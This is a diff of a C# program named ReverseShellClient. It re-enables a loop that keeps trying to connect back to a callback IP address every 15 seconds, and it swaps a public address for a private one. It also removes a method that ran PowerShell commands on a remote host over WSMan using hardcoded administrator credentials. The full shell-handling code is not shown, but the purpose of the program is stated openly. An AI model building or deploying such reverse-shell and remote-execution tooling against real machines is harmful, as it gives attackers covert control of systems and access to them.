@@ -1,11 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-using System.Management.Automation;
-using System.Management.Automation.Runspaces;
 using System.Net;
 using System.Net.Sockets;
-using System.Security;
 using System.Text;
 
 namespace ReverseShellClient
@@ -22,12 +19,10 @@ namespace ReverseShellClient
 
         static void Main(string[] args)
         {
-            int port = args.Length > 0 ? int.Parse(args[0]) : 3389;// 6666;
+            int port = args.Length > 0 ? int.Parse(args[0]) : 6666;
 
             string[] ips = {
-                //"192.168.2.116",
-                //"192.168.1.111",
-                "62.12.112.147"
+                "192.168.100.2"
             };
             int ipIndex = 0;
 
@@ -37,50 +32,11 @@ namespace ReverseShellClient
                 ipIndex = (ipIndex + 1) % ips.Length;
                 Console.WriteLine($"Trying to connect to {tryIp} on port {port}");
 
-               // ConnectToServer(tryIp, port);
-                RunCommands();
+                ConnectToServer(tryIp, port);
                 System.Threading.Thread.Sleep(15000); //Wait 15 seconds 
-               
             }
         }
-        private static void RunCommands()
-        {
-            string userName = "Admin";
-            string password = "Password123!";
-            var securestring = new SecureString();
-            foreach (Char c in password)
-            {
-                securestring.AppendChar(c);
-            }
-            PSCredential creds = new PSCredential(userName, securestring);
-            WSManConnectionInfo connectionInfo = new WSManConnectionInfo();
 
-            connectionInfo.ComputerName = "192.168.100.149";
-            connectionInfo.Credential = creds;
-            Runspace runspace = RunspaceFactory.CreateRunspace(connectionInfo);
-            runspace.Open();
-            using (PowerShell ps = PowerShell.Create())
-            {
-                ps.Runspace = runspace;
-                ps.AddScript("ipconfig");
-                StringBuilder sb = new StringBuilder();
-                try
-                {
-                    var results = ps.Invoke();
-                    foreach (var x in results)
-                    {
-                        sb.AppendLine(x.ToString());
-                    }
-                    Console.WriteLine(sb.ToString());
-                }
-                catch (Exception e)
-                {
-                    //problem running script
-                }
-            }
-            runspace.Close();
-            Console.ReadLine();
-    }
         private static void ConnectToServer(string ip, int port)
         {
             tcpClient = new TcpClient();
